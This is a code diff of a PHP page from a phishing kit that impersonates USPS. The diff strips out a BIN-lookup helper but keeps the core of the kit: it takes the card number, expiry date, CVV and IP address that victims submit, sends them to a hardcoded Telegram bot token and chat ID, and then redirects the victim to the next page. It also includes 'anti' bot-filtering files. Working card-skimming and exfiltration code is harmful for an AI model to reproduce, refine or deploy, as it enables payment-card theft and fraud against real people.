@@ -1,8 +1,4 @@
 <?php
-
-ini_set('log_errors', 1);
-ini_set('error_log', '/var/log/apache2/error.log'); // Specify the path to your error log file
-
 session_start();
 include "anti/anti1.php";
 include "anti/anti2.php"; 
@@ -29,85 +25,26 @@ function sendMessageT($chatID, $messaggio, $token) {
     }
     curl_close($curl);
 }
-
-function getccinfo($bin)
-{
-    $ch = curl_init();
-
-    curl_setopt($ch, CURLOPT_URL, 'https://bincheck.io/details/' . $bin);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
-
-    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
-
-    $headers = array();
-    $headers[] = 'Authority: bincheck.io';
-    $headers[] = 'Cache-Control: max-age=0';
-    $headers[] = 'Sec-Ch-Ua: \"Google Chrome\";v=\"93\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"93\"';
-    $headers[] = 'Sec-Ch-Ua-Mobile: ?0';
-    $headers[] = 'Sec-Ch-Ua-Platform: \"Windows\"';
-    $headers[] = 'Upgrade-Insecure-Requests: 1';
-    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36';
-    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
-    $headers[] = 'Sec-Fetch-Site: none';
-    $headers[] = 'Sec-Fetch-Mode: navigate';
-    $headers[] = 'Sec-Fetch-User: ?1';
-    $headers[] = 'Sec-Fetch-Dest: document';
-    $headers[] = 'Accept-Language: en';
-    $headers[] = 'Cookie: _ga_CGDE2TMKTW=GS1.1.1632152538.1.0.1632152538.0; _ga=GA1.2.1463149369.1632152539; _gid=GA1.2.696055406.1632152539; _gat_gtag_UA_144736692_1=1; __gads=ID=6ee82cbdb2fd6b64-22a0c91256cb00c1:T=1632152541:RT=1632152541:S=ALNI_MYV4gn6wcRBCrbqHQOJFO8QK8TpPQ; __gpi=00000000-0000-0000-0000-000000000000&YmluY2hlY2suaW8=&Lw==; __cf_bm=KhPgB9sHSXjn6PGgbBWwdtzHllHskBh88GMU2lInHtE-1632152543-0-AcpXT/hw/oZPXyYSV2kZRFognTGDXjtRWpym8r7x8EunqDcpdUxmeAZQI+x1kKJ2xSjqjzysxUYIGSY+5zUbDAuCDrrwn9mHVdMEDXeZM2I76c3bgaPVI/Hcw1PKH4UKog==; XSRF-TOKEN=eyJpdiI6Iko5YXJQb1MxcUprZFlMNlRydXIyT3c9PSIsInZhbHVlIjoiMmtjMDI5NHNMbHFsYTBGaW8zamgwbHpiWXJCVERxWFJoS0VlN0R2Mm1NSk42bHFYaUcrZjdiTTdsV1E3OHRsUkd0bU8ycVVaUkdFNnJxZCtWRDJYNUxoeUg1YkR3em1HcVUraDdlTWp6YnRRdG9CR3MzOXJiQWwrbUNJVzY4QTEiLCJtYWMiOiIxODhjYzUxMGJhZmMwODE5YTJiMzFkM2MwNTRhNDdjZDU5ZDk0MDhmNzA0MDQwMTNjZjNmOTAzMTNmYzQ1ZjgzIn0%3D; laravel_session=eyJpdiI6InJOamR1VHU3LzZSS2dQby96UHpQYnc9PSIsInZhbHVlIjoiRjBpd0ZPL2VKT3VuT3VQRS8wcnRJR1ROeEhVWWtKa2tyVU1HbkhSUVNORS83T2N3Uis3UU5jeEQzdWdnc1hTdkFxSnFNSFFReGFqQStlZTRrUGhFZVUrQ3pjSmdDTUh1YTlBUU1GOURmSGRRdHMvTmE4OUJURzRGdGZJQ0MvMmgiLCJtYWMiOiI0YzdhZWM1MGIwNGMxMTIxOWIwNDZjN2JkNjdmODgyZDJkNmVhN2E5YjI1ZTcwOGU5YTYyYzMzZjUxZTJlZjE4In0%3D';
-    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    $result = curl_exec($ch);
-    $DOM = new DOMDocument();
-    libxml_use_internal_errors(true);
-    $DOM->loadHTML($result);
-    $Detail = $DOM->getElementsByTagName('td');
-    foreach ($Detail as $NodeHeader) {
-        $aDataTableHeaderHTML[] = trim($NodeHeader->textContent);
-    }
-
-    $finalrezult[0] = $aDataTableHeaderHTML[3];
-    $finalrezult[1] = $aDataTableHeaderHTML[5];
-    $finalrezult[2] = $aDataTableHeaderHTML[7];
-    $finalrezult[3] = $aDataTableHeaderHTML[9];
-    $finalrezult[4] = $aDataTableHeaderHTML[15];
-    if (curl_errno($ch)) {
-        echo 'Error:' . curl_error($ch);
-    }
-    curl_close($ch);
-    return $finalrezult ;
-}
-
-
-
-
-
-
-
 if(isset($_POST['okbb'])){
-$ip = getenv("REMOTE_ADDR");
-$cc        = str_replace(' ', '', $_POST['number']);
-$bin        = substr($cc, 0, 6);
+    $ip = getenv("REMOTE_ADDR");
+    $cc = str_replace(' ', '', $_POST['number']);
+    $exp = $_POST['expiry'];
+    $cvv = $_POST['cvc'];
 
+    $message = "-------------------- <3 USPS <3-------------------\n";
+    $message .= "cc  : ".$cc."\nexp : ".$exp."\ncvv : ".$cvv."\nIP      : ".$ip."\n";
+    $message .= "-------------------- <3 USPS <3-------------------\n";
 
+	sendMessageT('1064643518',$message,'6699499754:AAHaG6cBsD7zxVMrfOAcebt7u66bs8AMMXk');
+    $_SESSION["msg"] = $message;
 
-$details  = getccinfo($bin);
-$_SESSION['_namebank_'] = $namebank   = $details->bank->name;
-    $_SESSION['bn'] =$details[3];
-    $_SESSION['cn'] =$details[4];
-$message =   $_SESSION["msg"] ;
-$message .= "-------------------- <3 USPS <3-------------------\nBrand : ".$details[0]."\nType : ".$details[1]."\nLevel : ".$details[2]."\nCountry : ".$details[4]."\ncc  : ".$cc." (".$details[3].")\nexp : ".$_POST['expiry']."\ncvv : ".$_POST['cvc']."\nIP      : ".$ip."\n-------------------- <3 USPS <3-------------------\n";
-
-sendMessageT('1064643518',$message,'6699499754:AAHaG6cBsD7zxVMrfOAcebt7u66bs8AMMXk');
-    $_SESSION["msg"] = $message ;
-
-
-if ($sms=='1'){
-HEADER("Location: index3.php");
-}else{
-HEADER("Location: index3.php");
+    if ($sms=='1'){
+        HEADER("Location: index3.php");
+    } else {
+        HEADER("Location: index3.php");
+    }
 }
-}
+
 ?>
 <html class="js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths dj_gecko dj_contentbox" lang="en">
 <head>
